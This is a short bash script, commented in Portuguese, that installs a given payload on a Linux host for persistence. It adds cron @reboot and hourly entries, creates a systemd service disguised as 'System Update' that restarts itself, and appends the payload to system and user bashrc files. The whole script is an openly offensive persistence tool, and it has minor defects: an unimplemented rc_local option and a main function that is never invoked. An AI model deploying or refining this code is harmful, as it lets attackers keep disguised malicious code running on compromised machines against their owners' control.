#!/bin/bash
# persistence_manager.sh - Gerencia diferentes métodos

METHODS=("cron" "systemd" "rc_local" "bashrc")

install_cron() {
    local payload_path="$1"
    (crontab -l 2>/dev/null; echo "@reboot $payload_path") | crontab -
    (crontab -l; echo "0 * * * * $payload_path") | crontab -
}

install_systemd() {
    local payload_path="$1"
    cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update
After=network.target

[Service]
ExecStart=$payload_path
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable update.service
}

install_bashrc() {
    local payload_path="$1"
    echo "$payload_path &" >> /etc/bash.bashrc
    echo "$payload_path &" >> ~/.bashrc
}

# Uso: ./persistence_manager.sh --method cron /tmp/payload
main() {
    local method="$1"
    local payload="$2"
    
    case "$method" in
        "cron") install_cron "$payload" ;;
        "systemd") install_systemd "$payload" ;;
        "bashrc") install_bashrc "$payload" ;;
        "all")
            install_cron "$payload"
            install_systemd "$payload"
            install_bashrc "$payload"
            ;;
    esac
}